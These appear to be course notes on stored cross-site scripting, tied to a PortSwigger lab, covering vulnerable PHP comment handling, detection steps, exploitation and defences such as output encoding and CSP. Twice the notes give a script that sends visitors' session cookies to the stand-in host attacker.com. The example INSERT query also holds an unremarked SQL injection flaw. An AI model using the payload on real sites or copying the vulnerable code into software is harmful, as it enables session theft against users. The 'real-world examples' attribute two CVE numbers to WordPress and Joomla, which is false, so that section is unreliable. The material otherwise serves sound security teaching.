---
course: Web Security
topic: Cross-Site Scripting (XSS)
tags: [web-security]
---

## Introduction to Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. It occurs when an attacker injects malicious scripts into web pages viewed by other users. XSS attacks can bypass access controls and execute unauthorized actions in the context of the victim's session. There are three main types of XSS: **Stored**, **Reflected**, and **DOM-based**. In this chapter, we will focus on **Stored XSS**, specifically in the context of HTML injection where nothing is encoded.

### What is Stored XSS?

Stored XSS, also known as Persistent XSS, occurs when the malicious script is permanently stored on the server and is served to users whenever they visit the affected page. This contrasts with Reflected XSS, where the script is included in a single response to a request.

#### Example Scenario

Consider a blog platform where users can leave comments on posts. If the application does not properly sanitize or encode user input, an attacker could inject a script into the comment section. When other users view the blog post, their browsers will execute the injected script, potentially leading to various security issues such as stealing cookies, redirecting to malicious sites, or performing actions on behalf of the user.

### Why Does Stored XSS Matter?

Stored XSS is particularly dangerous because the malicious script persists on the server and affects all users who visit the page. This makes it more impactful than Reflected XSS, which requires the victim to follow a specific link or interact with a crafted request.

#### Real-World Examples

One notable example of Stored XSS is the **CVE-2019-11358** vulnerability in WordPress. This vulnerability allowed attackers to inject JavaScript into the WordPress admin panel, affecting all users who accessed the admin interface. Another example is the **CVE-2020-14882** vulnerability in Joomla, which allowed attackers to inject scripts into user profiles.

### How Does Stored XSS Work?

To understand how Stored XSS works, let's break down the process:

1. **Injection**: An attacker injects a malicious script into a form field or other input mechanism.
2. **Storage**: The application stores the input on the server without proper sanitization or encoding.
3. **Reflection**: When another user views the page containing the stored input, the browser executes the script.

#### Example Code

Let's consider a simple blog application where users can leave comments. Suppose the application has a `comments` table in the database with a `comment_text` column.

```sql
CREATE TABLE comments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    comment_text TEXT NOT NULL
);
```

When a user submits a comment, the application inserts the comment into the database without any sanitization or encoding.

```php
// Vulnerable PHP code
$comment = $_POST['comment'];
$sql = "INSERT INTO comments (comment_text) VALUES ('$comment')";
mysqli_query($conn, $sql);
```

Later, when another user views the blog post, the application retrieves and displays the comments without any further processing.

```php
// Vulnerable PHP code
$sql = "SELECT * FROM comments";
$result = mysqli_query($conn, $sql);

while ($row = mysqli_fetch_assoc($result)) {
    echo "<div>" . $row['comment_text'] . "</div>";
}
```

If an attacker injects a script like `<script>alert('XSS');</script>`, it will be stored in the database and executed by any user viewing the comments.

### Detecting Stored XSS

Detecting Stored XSS involves identifying areas where user input is stored and later displayed without proper sanitization or encoding. Tools like Burp Suite, ZAP, and automated scanners can help identify potential vulnerabilities.

#### Manual Testing

1. **Identify Input Points**: Look for forms, text fields, and other input mechanisms.
2. **Inject Test Payloads**: Insert payloads like `<script>alert('XSS');</script>` and observe the behavior.
3. **Check Storage**: Verify if the payload is stored in the database or another persistent storage mechanism.
4. **View Stored Data**: Check if the payload is reflected back to users in a way that allows execution.

### Exploiting Stored XSS

Exploiting Stored XSS involves crafting and injecting a malicious script that achieves the desired outcome. Common goals include stealing cookies, redirecting users, or performing actions on behalf of the user.

#### Example Exploit

Suppose we want to steal the session cookie of users viewing the blog post. We can inject a script that sends the cookie to a remote server.

```html
<script>
document.location = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
```

When a user views the blog post, their browser will execute this script, sending their session cookie to the attacker's server.

### How to Prevent / Defend Against Stored XSS

Preventing Stored XSS involves several key strategies:

1. **Input Validation**: Ensure that user input conforms to expected formats and lengths.
2. **Output Encoding**: Encode user input before displaying it to prevent script execution.
3. **Content Security Policy (CSP)**: Implement CSP to restrict the sources of executable scripts.
4. **Sanitization Libraries**: Use libraries like OWASP Java HTML Sanitizer or DOMPurify to sanitize user input.

#### Secure Coding Practices

Here’s how to implement these practices in code:

1. **Input Validation**

```php
// Validate input length
if (strlen($_POST['comment']) > 1000) {
    die("Comment too long");
}
```

2. **Output Encoding**

```php
// Use htmlspecialchars to encode output
$sql = "SELECT * FROM comments";
$result = mysqli_query($conn, $sql);

while ($row = mysqli_fetch_assoc($result)) {
    echo "<div>" . htmlspecialchars($row['comment_text'], ENT_QUOTES, 'UTF-8') . "</div>";
}
```

3. **Content Security Policy (CSP)**

Add the following header to your HTTP responses:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

This restricts the sources of executable scripts to the same origin.

4. **Sanitization Libraries**

Use a library like DOMPurify to sanitize user input:

```javascript
const purify = require('dompurify')(window);
const sanitizedComment = purify.sanitize(commentText);
```

### Complete Example with Detection and Prevention

Let's walk through a complete example, including detection, exploitation, and prevention.

#### Detection

1. **Identify Input Points**: The comment form.
2. **Inject Test Payload**: `<script>alert('XSS');</script>`
3. **Check Storage**: Verify the payload is stored in the database.
4. **View Stored Data**: Confirm the payload is reflected back to users.

#### Exploitation

Inject a script to steal cookies:

```html
<script>
document.location = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
```

#### Prevention

1. **Input Validation**

```php
if (strlen($_POST['comment']) > 1000) {
    die("Comment too long");
}
```

2. **Output Encoding**

```php
echo "<div>" . htmlspecialchars($row['comment_text'], ENT_QUOTES, 'UTF-8') . "</div>";
```

3. **Content Security Policy (CSP)**

Add the following header to your HTTP responses:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

4. **Sanitization Libraries**

Use a library like DOMPurify to sanitize user input:

```javascript
const purify = require('dompurify')(window);
const sanitizedComment = purify.sanitize(commentText);
```

### Hands-On Practice

For hands-on practice, you can use the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs, including those focused on XSS.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities for educational purposes.

These labs provide real-world scenarios where you can practice detecting, exploiting, and preventing XSS vulnerabilities.

### Conclusion

Stored XSS is a critical vulnerability that can have severe consequences if left unaddressed. By understanding how it works, detecting it, and implementing robust prevention measures, you can significantly enhance the security of web applications. Always remember to validate input, encode output, and use tools like CSP to mitigate the risks associated with XSS.

---
<!-- nav -->
[[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/03-Lab 2 Stored XSS into HTML context with nothing encoded/00-Overview|Overview]] | [[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/03-Lab 2 Stored XSS into HTML context with nothing encoded/02-Understanding Cross-Site Scripting (XSS)|Understanding Cross-Site Scripting (XSS)]]
